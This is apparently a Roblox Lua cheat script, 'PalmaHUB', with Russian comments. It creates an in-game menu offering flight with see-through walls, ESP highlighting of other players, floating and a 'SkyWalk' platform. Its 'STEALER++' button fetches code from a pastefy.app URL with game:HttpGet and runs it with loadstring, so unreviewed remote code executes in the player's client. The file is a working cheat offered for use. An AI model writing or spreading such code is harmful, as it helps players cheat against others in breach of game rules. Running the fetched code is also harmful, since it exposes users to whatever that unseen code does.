local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local mouse = player:GetMouse()

-- Создание кнопки открытия/закрытия
local toggleButton = Instance.new("TextButton")
toggleButton.Name = "ToggleButton"
toggleButton.Size = UDim2.new(0, 100, 0, 30)
toggleButton.Position = UDim2.new(0, 10, 0, 10)
toggleButton.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
toggleButton.Text = "Open"
toggleButton.TextColor3 = Color3.new(1, 1, 1)
toggleButton.Font = Enum.Font.Code
toggleButton.TextSize = 14
toggleButton.BorderSizePixel = 0
toggleButton.ZIndex = 10

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 6)
toggleCorner.Parent = toggleButton

local toggleStroke = Instance.new("UIStroke")
toggleStroke.Color = Color3.fromRGB(0, 100, 0)
toggleStroke.Thickness = 1
toggleStroke.Parent = toggleButton

-- Создание основного GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PalmaHUB"
screenGui.Parent = player.PlayerGui
screenGui.ResetOnSpawn = false

-- Основной фрейм
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 300, 0, 350) -- Увеличил высоту для новой кнопки
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -175)
mainFrame.BackgroundColor3 = Color3.fromRGB(144, 238, 144) -- Светло-зеленый
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Visible = false -- Сначала скрыт

-- Создание скругленных углов
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = mainFrame

-- Обводка (изменено на черную)
local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(0, 0, 0) -- Черная обводка
stroke.Thickness = 2
stroke.Parent = mainFrame

-- Заголовок
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
title.Text = "PalmaHUB"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.Code
title.TextSize = 20
title.BorderSizePixel = 0

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = title

title.Parent = mainFrame

-- Контейнер для кнопок
local buttonsContainer = Instance.new("Frame")
buttonsContainer.Name = "ButtonsContainer"
buttonsContainer.Size = UDim2.new(1, -20, 1, -60)
buttonsContainer.Position = UDim2.new(0, 10, 0, 50)
buttonsContainer.BackgroundTransparency = 1
buttonsContainer.Parent = mainFrame

-- Функция для создания кнопок
local function createButton(name, text, position)
    local button = Instance.new("TextButton")
    button.Name = name
    button.Size = UDim2.new(1, 0, 0, 40)
    button.Position = position
    button.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
    button.Text = text
    button.TextColor3 = Color3.new(1, 1, 1)
    button.Font = Enum.Font.Code
    button.TextSize = 16
    button.BorderSizePixel = 0
    
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 8)
    buttonCorner.Parent = button
    
    local buttonStroke = Instance.new("UIStroke")
    buttonStroke.Color = Color3.fromRGB(0, 100, 0)
    buttonStroke.Thickness = 1
    buttonStroke.Parent = button
    
    button.Parent = buttonsContainer
    
    return button
end

-- Создание кнопок
local button1 = createButton("FloorStealButton", "3 floor steal", UDim2.new(0, 0, 0, 0))
local button2 = createButton("ESPButton", "esp", UDim2.new(0, 0, 0, 50))
local button3 = createButton("FloatButton", "float", UDim2.new(0, 0, 0, 100))
local button4 = createButton("StealerPlusButton", "STEALER++", UDim2.new(0, 0, 0, 150))
local button5 = createButton("SkyWalkButton", "SkyWalk", UDim2.new(0, 0, 0, 200)) -- Новая кнопка SkyWalk

-- Функционал перетаскивания
local dragging = false
local dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

mainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- Переменные для бесконечного полета
local isFlying = false
local flightConnection = nil

-- Функционал плавания
local isFloating = false
local floatConnection = nil
local autoStopTimer = nil

local function startFloating()
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local humanoidRootPart = player.Character.HumanoidRootPart
        
        -- Останавливаем предыдущее плавание если было
        if floatConnection then
            floatConnection:Disconnect()
        end
        
        if autoStopTimer then
            autoStopTimer:Disconnect()
        end
        
        isFloating = true
        button3.Text = "FLOATING..."
        button3.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
        
        -- Запускаем плавание
        floatConnection = RunService.Heartbeat:Connect(function()
            if not isFloating or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
                if floatConnection then
                    floatConnection:Disconnect()
                end
                return
            end
            
            -- Получаем направление камеры
            local camera = workspace.CurrentCamera
            local cameraCFrame = camera.CFrame
            local direction = cameraCFrame.LookVector
            
            -- Двигаем персонажа в направлении камеры с нормальной скоростью
            humanoidRootPart.Velocity = direction * 25 -- Нормальная скорость плавания
        end)
        
        -- Автоматическое отключение через 10 секунд
        autoStopTimer = game:GetService("RunService").Heartbeat:Connect(function()
            wait(10) -- Ждем 10 секунд
            
            if isFloating then
                isFloating = false
                if floatConnection then
                    floatConnection:Disconnect()
                    floatConnection = nil
                end
                button3.Text = "float"
                button3.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
            end
            
            autoStopTimer:Disconnect()
            autoStopTimer = nil
        end)
    end
end

local function stopFloating()
    isFloating = false
    button3.Text = "float"
    button3.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
    
    if floatConnection then
        floatConnection:Disconnect()
        floatConnection = nil
    end
    
    if autoStopTimer then
        autoStopTimer:Disconnect()
        autoStopTimer = nil
    end
end

-- Функционал SkyWalk
local skyWalkEnabled = false
local skyWalkPart = nil
local skyWalkConnection = nil

local function updateSkyWalk()
    if not skyWalkEnabled or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
        if skyWalkPart then
            skyWalkPart:Destroy()
            skyWalkPart = nil
        end
        return
    end
    
    local hrp = player.Character.HumanoidRootPart
    local position = hrp.Position - Vector3.new(0, 5, 0) -- Блок на 5 единиц ниже игрока
    
    if not skyWalkPart then
        -- Создаем блок
        skyWalkPart = Instance.new("Part")
        skyWalkPart.Name = "SkyWalkPlatform"
        skyWalkPart.Size = Vector3.new(10, 1, 10)
        skyWalkPart.Anchored = true
        skyWalkPart.CanCollide = true
        skyWalkPart.Transparency = 0.7
        skyWalkPart.Color = Color3.fromRGB(100, 200, 255)
        skyWalkPart.Parent = workspace
    end
    
    -- Обновляем позицию блока
    skyWalkPart.Position = position
end

local function toggleSkyWalk()
    skyWalkEnabled = not skyWalkEnabled
    
    if skyWalkEnabled then
        button5.Text = "SkyWalk: ON"
        button5.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
        
        -- Создаем соединение для обновления позиции блока
        if skyWalkConnection then
            skyWalkConnection:Disconnect()
        end
        
        skyWalkConnection = RunService.Heartbeat:Connect(function()
            updateSkyWalk()
        end)
    else
        button5.Text = "SkyWalk"
        button5.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
        
        if skyWalkConnection then
            skyWalkConnection:Disconnect()
            skyWalkConnection = nil
        end
        
        if skyWalkPart then
            skyWalkPart:Destroy()
            skyWalkPart = nil
        end
    end
end

-- Функционал кнопок
-- Кнопка 1: 3 floor steal (бесконечный полет)
button1.MouseButton1Click:Connect(function()
    local character = player.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        local hrp = character.HumanoidRootPart
        
        isFlying = not isFlying
        
        if isFlying then
            -- Сохраняем текущую позицию для начала полета
            local startPosition = hrp.Position
            
            -- Делаем все объекты полупрозрачными
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj ~= hrp then
                    obj.LocalTransparencyModifier = 0.5
                end
            end
            
            -- Запускаем бесконечный полет
            flightConnection = RunService.Heartbeat:Connect(function()
                if isFlying and character and hrp then
                    -- Постоянно поднимаем игрока вверх
                    hrp.Velocity = Vector3.new(0, 100, 0)
                else
                    -- Останавливаем полет если соединение активно
                    if flightConnection then
                        flightConnection:Disconnect()
                        flightConnection = nil
                    end
                end
            end)
            
            button1.Text = "Stop flight"
            
        else
            -- Останавливаем полет
            if flightConnection then
                flightConnection:Disconnect()
                flightConnection = nil
            end
            
            -- Возвращаем прозрачность
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") then
                    obj.LocalTransparencyModifier = 0
                end
            end
            
            button1.Text = "3 floor steal"
        end
    end
end)

-- Кнопка 2: ESP
local espEnabled = false
local espObjects = {}

button2.MouseButton1Click:Connect(function()
    espEnabled = not espEnabled
    
    if espEnabled then
        -- Включаем ESP
        for _, otherPlayer in pairs(Players:GetPlayers()) do
            if otherPlayer ~= player and otherPlayer.Character then
                local highlight = Instance.new("Highlight")
                highlight.Name = "PalmaESP"
                highlight.FillColor = Color3.fromRGB(255, 0, 0)
                highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                highlight.FillTransparency = 0.5
                highlight.Parent = otherPlayer.Character
                espObjects[otherPlayer] = highlight
            end
        end
        
        -- Обработка новых игроков
        Players.PlayerAdded:Connect(function(newPlayer)
            if espEnabled then
                newPlayer.CharacterAdded:Connect(function(character)
                    if espEnabled then
                        local highlight = Instance.new("Highlight")
                        highlight.Name = "PalmaESP"
                        highlight.FillColor = Color3.fromRGB(255, 0, 0)
                        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                        highlight.FillTransparency = 0.5
                        highlight.Parent = character
                        espObjects[newPlayer] = highlight
                    end
                end)
            end
        end)
        
        button2.Text = "ESP: ON"
        button2.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    else
        -- Выключаем ESP
        for _, highlight in pairs(espObjects) do
            highlight:Destroy()
        end
        espObjects = {}
        
        button2.Text = "esp"
        button2.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
    end
end)

-- Кнопка 3: Float
button3.MouseButton1Click:Connect(function()
    if isFloating then
        stopFloating()
    else
        startFloating()
    end
end)

-- Кнопка 4: STEALER++
button4.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet('https://pastefy.app/CLu1GH4y/raw'))()
end)

-- Кнопка 5: SkyWalk
button5.MouseButton1Click:Connect(function()
    toggleSkyWalk()
end)

-- Добавляем основной фрейм на экран
mainFrame.Parent = screenGui
toggleButton.Parent = screenGui

-- Функция переключения видимости интерфейса
local function toggleInterface()
    if mainFrame.Visible then
        -- Закрываем интерфейс
        mainFrame.Visible = false
        toggleButton.Text = "Open"
    else
        -- Открываем интерфейс
        mainFrame.Visible = true
        toggleButton.Text = "Close"
        
        -- Анимация появления
        mainFrame.Size = UDim2.new(0, 0, 0, 0)
        
        local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local tween = TweenService:Create(mainFrame, tweenInfo, {Size = UDim2.new(0, 300, 0, 350)})
        tween:Play()
    end
end

-- Обработка нажатия на кнопку переключения
toggleButton.MouseButton1Click:Connect(toggleInterface)

-- Останавливаем плавание при смерти
player.CharacterAdded:Connect(function(character)
    character:WaitForChild("Humanoid").Died:Connect(function()
        stopFloating()
    end)
end)